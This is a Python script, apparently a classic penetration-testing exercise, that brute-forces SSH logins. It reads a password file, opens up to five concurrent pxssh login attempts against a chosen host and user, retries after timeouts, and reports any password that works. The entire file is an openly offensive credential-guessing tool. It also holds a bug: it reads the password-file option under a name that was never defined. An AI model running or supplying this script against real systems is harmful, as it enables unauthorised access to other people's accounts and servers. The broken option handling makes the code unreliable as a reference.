from pexpect import pxssh
import optparse
import time
from threading import *

# Maximum number of simultaneous connections
maxConnections = 5
# Semaphore to limit the number of concurrent connection attempts
connection_lock = BoundedSemaphore(value=maxConnections)

# Global variables to track the state of the brute force attack
Found = False  # Flag to indicate if a valid password has been found
Fails = 0  # Counter for failed login attempts


def connect(host, user, password, release):
    """
    Attempt to connect to the specified host using SSH with the provided user and password.

    Parameters:
    host (str): The target host's address.
    user (str): The username for SSH login.
    password (str): The password to test.
    release (bool): A flag indicating if the connection lock should be released after the attempt.

    The function will retry the connection if it encounters specific exceptions.
    """
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)  # Attempt to log in with the provided credentials
        print('[+] Password Found: ' + password)
        Found = True  # Set the flag if password is found
    except Exception as e:
        # Handle specific exceptions to retry connection
        if 'read_nonblocking' in str(e):
            Fails += 1  # Increment fail counter
            time.sleep(5)  # Wait before retrying
            connect(host, user, password, False)  # Retry the connection
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)  # Wait for a moment
            connect(host, user, password, False)  # Retry the connection
    finally:
        if release:
            connection_lock.release()  # Release the connection lock


def main():
    """
    Main function to parse command line arguments and initiate the brute force attack.

    It expects the target host, username, and a password file as input.
    """
    parser = optparse.OptionParser('usage%prog ' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='password_file', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()

    host = options.tgtHost
    password_file = options.passwdFile
    user = options.user

    # Validate that required options are provided
    if host is None or password_file is None or user is None:
        print(parser.usage)
        exit(0)

    try:
        # Open the password file with error handling for encoding
        with open(password_file, 'r', encoding='utf-8', errors='replace') as fn:
            for line in fn.readlines():
                if Found:
                    print("[*] Exiting: Password Found")
                    exit(0)  # Exit if password is found
                if Fails > 5:
                    print("[!] Exiting: Too Many Socket Timeouts")
                    exit(0)  # Exit if too many socket timeouts

                connection_lock.acquire()  # Acquire lock for new connection attempt
                password = line.strip('\r').strip('\n')  # Clean the password string
                print("[-] Testing: " + str(password))
                thread = Thread(target=connect, args=(host, user, password, True))
                thread.start()  # Start a new thread for the connection attempt
    except FileNotFoundError:
        print(f"[!] Error: File {password_file} not found.")  # Handle file not found error
    except Exception as e:
        print(f"[!] An error occurred: {e}")  # Handle other exceptions


if __name__ == '__main__':
    main()
